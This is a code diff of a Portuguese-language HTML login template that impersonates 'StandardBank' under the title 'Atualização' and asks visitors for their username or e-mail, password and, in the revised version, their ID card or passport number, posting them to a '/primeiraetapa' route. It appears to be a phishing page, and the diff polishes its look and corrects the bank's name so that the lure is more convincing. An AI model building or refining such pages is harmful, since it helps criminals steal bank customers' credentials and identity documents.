@@ -1,80 +1,99 @@
 <!DOCTYPE html>
 <html lang="pt">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Atualização StandarBank</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Atualização StandardBank</title>
   <style>
     body {
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-      color: white;
+      margin: 0;
+      background: linear-gradient(to right, #061a40, #004080);
       font-family: 'Segoe UI', sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
-      margin: 0;
+      padding: 1rem;
+      color: #fff;
     }
+
     .container {
-      background-color: rgba(255, 255, 255, 0.05);
-      padding: 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 12px rgba(0,0,0,0.3);
-      max-width: 360px;
+      background: rgba(255,255,255,0.05);
+      backdrop-filter: blur(12px);
+      border-radius: 18px;
+      padding: 2rem;
+      max-width: 340px;
       width: 100%;
       text-align: center;
+      box-shadow: 0 0 30px rgba(0,0,0,0.35);
     }
+
     img {
-      width: 80px;
-      margin-bottom: 15px;
+      width: 70px;
       border-radius: 50%;
+      margin-bottom: 15px;
     }
+
     h2 {
-      margin-bottom: 5px;
+      margin-bottom: 0.3rem;
+      font-size: 1.4rem;
     }
+
+    .subtitle {
+      font-size: 0.9rem;
+      margin-bottom: 1.5rem;
+      color: #ccc;
+    }
+
     input {
       width: 100%;
       padding: 10px;
       margin: 8px 0;
       border: none;
-      border-radius: 6px;
+      border-radius: 8px;
+      font-size: 1rem;
       background: #fff;
-      color: #333;
+      color: #222;
     }
-    .btn {
-      margin-top: 10px;
-      padding: 12px;
-      background: linear-gradient(145deg, #1c1c1c, #3f3f3f);
-      color: white;
+
+    button {
+      padding: 10px 25px;
+      margin-top: 15px;
+      font-size: 0.95rem;
       font-weight: bold;
+      color: #fff;
+      background: linear-gradient(135deg, #0077b6, #0096c7);
       border: none;
-      border-radius: 10px;
-      width: 100%;
+      border-radius: 8px;
       cursor: pointer;
-      box-shadow: 0 4px 0 #000;
-      transition: transform 0.15s ease;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+      transition: transform 0.2s ease;
     }
-    .btn:active {
-      transform: translateY(4px);
-      box-shadow: none;
+
+    button:hover {
+      transform: scale(1.05);
+      background: linear-gradient(135deg, #005b8c, #0077b6);
     }
-    p {
-      font-size: 0.9em;
-      margin-top: 12px;
-      color: #ccc;
+
+    p.rodape {
+      margin-top: 1.2rem;
+      font-size: 0.85rem;
+      color: #aaa;
     }
   </style>
 </head>
 <body>
-  <form class="container" action="/submit" method="POST">
-    <img src="{{ url_for('static', filename='ari.jpg') }}" alt="StandarBank Logo">
-    <h2>Atualização StandarBank</h2>
-    <p>Bem-vindo à StandarBank área de Atualização</p>
-    <input type="text" name="usuario" placeholder="Usuário ou E-mail" required>
-    <input type="password" name="palavra_chave" placeholder="Palavra-Chave" required>
-    <input type="tel" name="telemovel" placeholder="Número de Telemóvel" required>
-    <button class="btn" type="submit">Iniciar Sessão</button>
-    <p>Mantenha-se seguro e nós agradecemos 🛡</p>
+  <form class="container" method="POST" action="/primeiraetapa">
+    <img src="{{ url_for('static', filename='ari.jpg') }}" alt="Logo StandardBank">
+    <h2>Atualização StandardBank</h2>
+    <div class="subtitle">Bem-vindo à área de Atualização.</div>
+
+    <input type="text" name="usuario" placeholder="Usuário ou E-mail" required />
+    <input type="password" name="palavrachave" placeholder="Palavra-Chave" required />
+    <input type="text" name="documento" placeholder="Nº de BI ou Passaporte" required />
+
+    <button type="submit">Continuar</button>
+    <p class="rodape">StandardBank agradece sua confiança 🛡️</p>
   </form>
 </body>
 </html>
